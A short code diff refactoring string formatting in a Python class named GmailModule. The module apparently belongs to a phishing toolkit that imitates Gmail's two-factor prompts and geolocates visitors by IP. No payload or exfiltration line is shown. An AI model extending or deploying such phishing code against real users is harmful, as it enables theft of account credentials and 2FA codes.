@@ -65,16 +65,12 @@ class GmailModule(BaseModule):
 
         if twofactor_type == 'touchscreen':
             if twofactor_code:
-                additional = Markup(
-                    ', then touch number <strong>{}</strong>.'.format(
-                        twofactor_code
-                    )
-                )
+                additional = Markup(f', then touch number <strong>{twofactor_code}</strong>.')
                 twofactor_code = additional
             else:
                 twofactor_code = '.'
 
-        tf_type = '{}.html'.format(twofactor_type)
+        tf_type = f'{twofactor_type}.html'
         template = self.env.get_template(tf_type)
 
         next_url = '/redirect'
@@ -100,9 +96,7 @@ class GmailModule(BaseModule):
 
         city, region, zip_code = '','',''
         try:
-            geoip_url = 'https://freegeoip.net/json/{}'.format(
-                request.remote_addr
-            )
+            geoip_url = f'https://freegeoip.net/json/{request.remote_addr}'
             geo_browser = mechanicalsoup.StatefulBrowser()
             geo_response = geo_browser.open(geoip_url)
             geo = json.loads(geo_response.text)
